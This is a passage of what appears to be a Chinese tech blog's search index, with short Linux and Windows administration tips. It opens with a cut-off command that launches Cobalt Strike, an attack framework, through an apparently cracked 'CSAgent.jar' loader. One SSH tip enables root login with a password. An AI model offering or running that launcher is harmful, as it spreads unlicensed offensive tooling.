-javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -jar cobaltstrike.jar"</span>,0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> 安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux中echo写入文件</title>
      <link href="/2022/05/24/linux-zhong-echo-xie-ru-wen-jian/"/>
      <url>/2022/05/24/linux-zhong-echo-xie-ru-wen-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="linux中echo写入文件"><a href="#linux中echo写入文件" class="headerlink" title="linux中echo写入文件"></a>linux中echo写入文件</h1><h2 id="覆盖文件内容"><a href="#覆盖文件内容" class="headerlink" title="覆盖文件内容"></a>覆盖文件内容</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"test"</span> <span class="token operator">&gt;</span> test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="追加文件内容"><a href="#追加文件内容" class="headerlink" title="追加文件内容"></a>追加文件内容</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"test"</span> <span class="token operator">&gt;&gt;</span> test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后面会自动加/n</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win7中安装vm-tools时Windows 无法验证此驱动程序软件的发布者</title>
      <link href="/2022/05/20/win7-bu-neng-an-zhuang-vm-tools/"/>
      <url>/2022/05/20/win7-bu-neng-an-zhuang-vm-tools/</url>
      
        <content type="html"><![CDATA[<h1 id="win7中安装vm-tools时Windows-无法验证此驱动程序软件的发布者"><a href="#win7中安装vm-tools时Windows-无法验证此驱动程序软件的发布者" class="headerlink" title="win7中安装vm-tools时Windows 无法验证此驱动程序软件的发布者"></a>win7中安装vm-tools时Windows 无法验证此驱动程序软件的发布者</h1><p>下载补丁安装<a href="https://www.catalog.update.microsoft.com/Search.aspx?q=kb4474419">Microsoft Update Catalog</a></p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>archlinux设置中文</title>
      <link href="/2022/05/17/archlinux-she-zhi-zhong-wen/"/>
      <url>/2022/05/17/archlinux-she-zhi-zhong-wen/</url>
      
        <content type="html"><![CDATA[<h1 id="archlinux设置中文"><a href="#archlinux设置中文" class="headerlink" title="archlinux设置中文"></a>archlinux设置中文</h1><p>执行<code>vim /etc/locale.gen</code>将下面字符前的#去掉</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zh_CN.GB18030 GB18030zh_CN.UTF-8 UTF-8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>locale -a</code>查看当前可用locale</p><p><code>vim /etc/locale.conf</code>添加<code>LANG=zh_CN.UTF-8</code>，这不是必须的，会导致乱码</p><p>这样做会好些</p><p>添加</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>zh_CN.UTF-8<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>zh_CN:en_US<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>到下面3个文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.bashrc：每次使用终端时会应用此处的设置.xinitrc：每次使用 startx 或 SLiM 来启动 X 窗口系统时会应用此处的设置.xprofile：每次使用 GDM 等显示管理器时会应用此处的设置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>安装字体</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-S</span> wqy-zenhei<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后添加如下到上述三个文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>zh_CN.UTF8<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>zh_CN:en_US<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">XMODIFIERS</span></span><span class="token operator">=</span>@im<span class="token operator">=</span>WQY<span class="token builtin class-name">export</span> <span class="token assign-left variable">GTK_IM_MODULE</span><span class="token operator">=</span><span class="token string">"wqy"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">QT_IM_MODULE</span><span class="token operator">=</span><span class="token string">"wqy"</span>wqy <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux设置root密码</title>
      <link href="/2022/05/17/linux-she-zhi-root-mi-ma/"/>
      <url>/2022/05/17/linux-she-zhi-root-mi-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="linux设置root密码"><a href="#linux设置root密码" class="headerlink" title="linux设置root密码"></a>linux设置root密码</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-i</span><span class="token function">passwd</span><span class="token comment">#输入你的密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux开启ssh</title>
      <link href="/2022/05/17/linux-kai-qi-ssh/"/>
      <url>/2022/05/17/linux-kai-qi-ssh/</url>
      
        <content type="html"><![CDATA[<h1 id="linux开启ssh"><a href="#linux开启ssh" class="headerlink" title="linux开启ssh"></a>linux开启ssh</h1><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config<span class="token comment">#修改</span><span class="token comment">#PermitRootLogin prohibit-password   改为 PermitRootLogin yes</span><span class="token comment">#PasswordAuthentication yes  改为   PasswordAuthentication yes</span><span class="token comment">#Esc-&gt;:-&gt;wq保存</span><span class="token comment">#启动</span>/etc/init.d/ssh start or<span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">ssh</span> start<span class="token comment">#开机启动</span>update-rc.d <span class="token function">ssh</span> <span class="token builtin class-name">enable</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> openssh-server<span class="token comment">#启动</span>/etc/init.d/ssh start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu22.04LTS不能运行Appimage</title>
      <link href="/2022/05/17/ubuntu22.04lts-bu-neng-yun-xing-appimage/"/>
      <url>/2022/05/17/ubuntu22.04lts-bu-neng-yun-xing-appimage/</url>
      
        <content type="html"><![CDATA[<h1 id="ubuntu22-04LTS不能运行Appimage"><a href="#ubuntu22-04LTS不能运行Appimage" class="headerlink" title="ubuntu22.04LTS不能运行Appimage"></a>ubuntu22.04LTS不能运行Appimage</h1><h2 id="先换个源"><a href="#先换个源" class="headerlink" title="先换个源"></a>先换个源</h2><p>执行<code>vim /etc/apt/sources.list</code></p><p>将下面内容任选一个加入</p><p>阿里</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>中科大</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>网易</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb http://mirrors.163.com/ubuntu/ jammy main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ jammy-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ jammy-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ jammy-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ jammy main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ jammy-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ jammy-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ jammy-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="先切换到root，也可以直接像下面使用sudo"><a href="#先切换到root，也可以直接像下面使用sudo" class="headerlink" title="先切换到root，也可以直接像下面使用sudo"></a>先切换到root，也可以直接像下面使用sudo</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-i</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装libfuse库"><a href="#安装libfuse库" class="headerlink" title="安装libfuse库"></a>安装libfuse库</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libfuse2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu虚拟机进入initramfs模式</title>
      <link href="/2022/05/12/ubuntu-xu-ni-ji-jin-ru-initramfs-mo-shi/"/>
      <url>/2022/05/12/ubuntu-xu-ni-ji-jin-ru-initramfs-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="ubuntu虚拟机进入initramfs模式"><a href="#ubuntu虚拟机进入initramfs模式" class="headerlink" title="ubuntu虚拟机进入initramfs模式"></a>ubuntu虚拟机进入initramfs模式</h1><p>可能是某个分区的出现了问题</p><p>查看你的命令行，查看是否有如<code>/dev/sda5分区</code>信息</p><p>如果有，执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">fsck</span> <span class="token parameter variable">-y</span> /dev/sda5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后重启，其他分区也相同</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Neither flex nor lex was found</title>
      <link href="/2022/05/06/neither-flex-nor-lex-was-found/"/>
      <url>/2022/05/06/neither-flex-nor-lex-was-found/</url>
      
        <content type="html"><![CDATA[<h1 id="Neither-flex-nor-lex-was-found"><a href="#Neither-flex-nor-lex-was-found" class="headerlink" title="Neither flex nor lex was found"></a>Neither flex nor lex was found</h1><p>编译<code>./configure</code>libpcap时报错Neither flex nor lex was found</p><p>安装flex，bison就能解决</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> flex<span class="token function">apt-get</span> <span class="token function">install</span> bison<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>报错：<code>libpcap.so.1: cannot open shared object file: No such file or directory</code></p><p>执行，添加一个链接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/lib/libpcap.so.1 /usr/lib/libpcap.so.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置WSUS连接时HTTP错误</title>
      <link href="/2022/04/30/pei-zhi-wsus-lian-jie-shi-http-cuo-wu/"/>
      <url>/2022/04/30/pei-zhi-wsus-lian-jie-shi-http-cuo-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="配置WSUS连接时HTTP错误"><a href="#配置WSUS连接时HTTP错误" class="headerlink" title="配置WSUS连接时HTTP错误"></a>配置WSUS连接时HTTP错误</h1><p>我尝试<code>ping microsoft.com</code>，并不能ping通更新服务</p><p>打开自动更新，也更新不了，应该就是网络的原因</p><p>首先关闭防火墙，如果是静态IP要保证能访问外网，不然你可以换成DHCP，自动获取</p><p>然后可以设置代理服务器，或者挂一个代理软件</p><p>注：你可以先把主机的系统先更新了，该打的补丁打了</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>发生系统错误6118</title>
      <link href="/2022/04/30/fa-sheng-xi-tong-cuo-wu-6118/"/>
      <url>/2022/04/30/fa-sheng-xi-tong-cuo-wu-6118/</url>
      
        <content type="html"><![CDATA[<h1 id="发生系统错误6118此工作组的服务器列表当前无法使用"><a href="#发生系统错误6118此工作组的服务器列表当前无法使用" class="headerlink" title="发生系统错误6118此工作组的服务器列表当前无法使用"></a>发生系统错误6118此工作组的服务器列表当前无法使用</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>当你在域服务器中运行<code>net view /domain</code>是报错</p><p>发生系统错误6118。此工作组的服务器列表当前无法使用</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>首先检查静态IP是否在设置的域环境，没有就改回来</p><p>win+R打开运行框输入<code>services.msc</code>运行</p><p>找到<code>computer browser</code> 服务</p><p>启动类型设置为自动</p><p>未启动则手动启动</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows监听端口失败</title>
      <link href="/2022/02/08/windows-jian-ting-duan-kou-shi-bai/"/>
      <url>/2022/02/08/windows-jian-ting-duan-kou-shi-bai/</url>
      
        <content type="html"><![CDATA[<h1 id="windows监听端口失败"><a href="#windows监听端口失败" class="headerlink" title="windows监听端口失败"></a>windows监听端口失败</h1><p>当你在某些情况需要用到监听端口时，会出现端口监听失败，获得类似信息<code>An attempt was made to access a socket in a way forbidden by its access permissions.</code>，这时你通过命令查看端口信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> -ano<span class="token operator">|</span><span class="token function">grep</span> 端口号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现这个端口并没有被占用，这时这些端口可能被系统保留了，查看保留端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh int ipv4 show excludedportrange <span class="token assign-left variable">protocol</span><span class="token operator">=</span>tcp<span class="token operator">|</span>udp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后你可以避开这些端口，或者</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>关闭占用程序，我这里默认hyper-v，大多数都是，关闭后<strong>重启</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dism.exe /Online /Disable-Feature:Microsoft-Hyper-V <span class="token comment"># 关闭</span>dism.exe /Online /Enable-Feature:Microsoft-Hyper-V <span class="token comment"># 打开</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li><p>配置动态端口，动态端口不能被保留，用完即释放</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh int ipv4 <span class="token builtin class-name">set</span> dynamicportrange <span class="token assign-left variable">protocol</span><span class="token operator">=</span>tcp <span class="token assign-left variable">startport</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token assign-left variable">numberofports</span><span class="token operator">=</span><span class="token number">254</span> <span class="token assign-left variable">store</span><span class="token operator">=</span>active<span class="token operator">|</span>persistent<span class="token comment"># start为起始端口，num为往后多少个端口，最小254，store为生效状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>将使用的端口移除保留端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh int ipv4 delete excludedportrange <span class="token assign-left variable">protocol</span><span class="token operator">=</span>tcp <span class="token assign-left variable">startport</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token assign-left variable">numberofports</span><span class="token operator">=</span><span class="token number">10</span><span class="token comment"># startport为起始端口，numberofports为往后多少个端口</span>netsh int ipv4 <span class="token function">add</span> excludedportrange <span class="token assign-left variable">protocol</span><span class="token operator">=</span>tcp <span class="token assign-left variable">startport</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token assign-left variable">numberofports</span><span class="token operator">=</span><span class="token number">10</span><span class="token comment"># 这是添加</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows中netstat命令</title>
      <link href="/2022/02/08/windows-zhong-netstat-ming-ling/"/>
      <url>/2022/02/08/windows-zhong-netstat-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="windows中netstat命令"><a href="#windows中netstat命令" class="headerlink" title="windows中netstat命令"></a>windows中netstat命令</h1><h2 id="netstat-查看Linux中网络系统状态信息"><a href="#netstat-查看Linux中网络系统状态信息" class="headerlink" title="netstat-查看Linux中网络系统状态信息"></a>netstat-查看Linux中网络系统状态信息</h2><p><code>NETSTAT [-a] [-b] [-e] [-f] [-i] [-n] [-o] [-p proto] [-r] [-s] [-t] [-x] [-y] [interval]</code></p><p>选项</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-a</span> 显示所有连接和监听端口<span class="token parameter variable">-b</span> 显示创建每个连接所涉及的可执行文件或监听端口。在某些情况下，众所周知的可执行文件宿主多个独立的组件，在这些情况下创建连接所涉及的组件序列或显示监听端口。在这种情况下，可执行文件名称在底部的 <span class="token punctuation">[</span><span class="token punctuation">]</span> 中，顶部是它调用的组件，以此类推，直到达到 TCP/IP<span class="token parameter variable">-e</span> 显示以太网统计信息，这可以与 <span class="token parameter variable">-s</span> 结合使用选项<span class="token parameter variable">-f</span> 显示外国的完全限定域名<span class="token punctuation">(</span>FQDN<span class="token punctuation">)</span>地址<span class="token parameter variable">-i</span> 显示 TCP 连接在其当前状态下花费的时间<span class="token parameter variable">-n</span> 以数字形式显示地址和端口号<span class="token parameter variable">-o</span> 显示与每个连接关联的拥有进程 ID<span class="token parameter variable">-p</span> proto 显示由 proto 指定的协议的连接；原型可以是以下任何一种：TCP、UDP、TCPv6 或 UDPv6。如果与 <span class="token parameter variable">-s</span> 一起使用显示每个协议统计信息的选项，proto 可以是以下任何一种：IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 或 UDPv6<span class="token parameter variable">-q</span> 显示所有连接、监听端口和绑定非侦听 TCP 端口。绑定的非侦听端口可能会也可能不会与活动连接相关联<span class="token parameter variable">-r</span> 显示路由表<span class="token parameter variable">-s</span> 显示每个协议的统计信息。默认情况下，统计信息是针对 IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 和 UDPv6 显示；-p 选项可用于指定默认值的子集<span class="token parameter variable">-t</span> 显示当前连接卸载状态<span class="token parameter variable">-x</span> 显示 NetworkDirect 连接、侦听器和共享端点<span class="token parameter variable">-y</span> 显示所有连接的 TCP 连接模板不能与其他选项结合使用interval 重新显示选定的统计信息，暂停间隔秒每个显示器之间。按 CTRL+C 停止重新显示统计数据。如果省略，netstat 将打印当前配置信息一次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> <span class="token parameter variable">-ano</span> <span class="token comment"># 显示所有连接和监听端口和ID号</span><span class="token function">netstat</span> -ano<span class="token operator">|</span><span class="token function">grep</span> yourfind grep也可以是findstr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ProtoLocal AddressForeign AddressStatePID<br>协议 本地地址远程地址状态进程号</p><p>State分为<br>LISTEN  ：监听状态<br>ESTABLISHED ：已建立联机<br>TIME_WAIT ：等待联机</p>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义鼠标右键新建文件</title>
      <link href="/2022/01/15/zi-ding-yi-shu-biao-you-jian-xin-jian-wen-jian/"/>
      <url>/2022/01/15/zi-ding-yi-shu-biao-you-jian-xin-jian-wen-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="自定义鼠标右键新建文件"><a href="#自定义鼠标右键新建文件" class="headerlink" title="自定义鼠标右键新建文件"></a>自定义鼠标右键新建文件</h1><ol><li><p>win+R 打开运行窗口，输入regedit进入注册表</p></li><li><p>进入<code>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Discardable\PostSetup\ShellNew</code>目录下</p></li><li><p><img src="https://images.dadream.eu.org/images/2024/07/152f7683d757589f71203eb222e9a741.png"></p><p>按这样修改，修改时可能你会遇到问题，看下文解决方法</p></li><li><p>进入<code>计算机\HKEY_CLASSES_ROOT\.md</code></p><p>将默认值修改为<code>Typora.md</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/1fa2ac32670771a9126a313f14190b7d.png"></p></li><li><p><img src="https://images.dadream.eu.org/images/2024/07/b64192b14f7e26154ea3dfd1ea1170c5.png"></p><p>如图，如果没有就这样修改</p></li></ol><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>还是到<code>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Discardable\PostSetup\ShellNew</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/febdbcad26eceedd0d87be8d8eead1d0.png"></p><p>右击ShellNew，点击权限，然后点击高级-&gt;禁用继承</p><p>双击你登陆的用户（就是一个小人儿那个），取消勾选完全控制，然后应用，确定，刷新</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>添加其他的也类似</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powershell导入一个自己写的模块</title>
      <link href="/2022/01/03/powershell-dao-ru-yi-ge-zi-ji-xie-de-mo-kuai/"/>
      <url>/2022/01/03/powershell-dao-ru-yi-ge-zi-ji-xie-de-mo-kuai/</url>
      
        <content type="html"><![CDATA[<h1 id="powershell导入一个自己写的模块"><a href="#powershell导入一个自己写的模块" class="headerlink" title="powershell导入一个自己写的模块"></a>powershell导入一个自己写的模块</h1><ol><li><p>想把你写的模块<code>name.psm1</code>放在<code>C:\Users\yourname\Documents\PowerShell\Modules\name</code>目录下</p><p>name为你的模块名</p></li><li><p>编辑文件<code>‪C:\Users\yourname\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</code>，添加<code>Import-Module name</code></p></li><li><p>重新启动就ok了</p></li><li><p>name.psm1其实放哪都可以，你只需要把第二步的name换为绝对路径，我放在那个目录是为了和其他模块一起方便管理</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows terminal使用</title>
      <link href="/2021/12/29/windows-terminal-shi-yong/"/>
      <url>/2021/12/29/windows-terminal-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="windows-terminal使用"><a href="#windows-terminal使用" class="headerlink" title="windows terminal使用"></a>windows terminal使用</h1><p>本文将介绍一些windows terminal的基本使用</p><p>首先是这个新建一个配置文件</p><p><img src="https://images.dadream.eu.org/images/2024/07/8d888573a6cfc1f763a264cb6d8324b6.png"></p><p>可以建一个空的，也可以复制</p><p>我们新建一个配置文件，如图</p><p><img src="https://images.dadream.eu.org/images/2024/07/792168aa40b5b4a90387e155e20924ee.png"></p><p>这个配置文件就像一个按钮，命令行就相当于按钮的链接，点击就运行命令</p><p>名称，命令行，图标可以稍微设置一下，其他的没啥可修改的</p><p>图标可以使用网络链接，也可以是本地路径</p><p>这里主要讲一下命令行</p><h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><p>主要的几个使用小技巧</p><ol><li><p>如果你定义了环境变量，直接写环境变量，就能直接运行，例如python</p><p><img src="https://images.dadream.eu.org/images/2024/07/c6ae37b1ec262041c708b28ab8a4985d.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/034a395513e6619aa85c873727e61e86.png"></p></li><li><p>没有定义环境变量，直接使用绝对路径</p><p><img src="https://images.dadream.eu.org/images/2024/07/8b0f5eb28a69e3b6b80d378f95cc01d3.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/87ed70ce6e4de3ea86cb1ea5582dff5a.png"></p></li><li><p>可以当作快速启动程序的一个方式</p><p><img src="https://images.dadream.eu.org/images/2024/07/8b7dc7c55b7e12433f950d8f45a6749c.png"></p></li><li><p>以管理员方式启动</p><p><img src="https://images.dadream.eu.org/images/2024/07/57fa6806c4db8e4b573a2ec2738071ee.png"></p><p>wt为环境变量或者绝对路径</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows terminal设置管理员</title>
      <link href="/2021/12/29/windows-terminal-she-zhi-guan-li-yuan/"/>
      <url>/2021/12/29/windows-terminal-she-zhi-guan-li-yuan/</url>
      
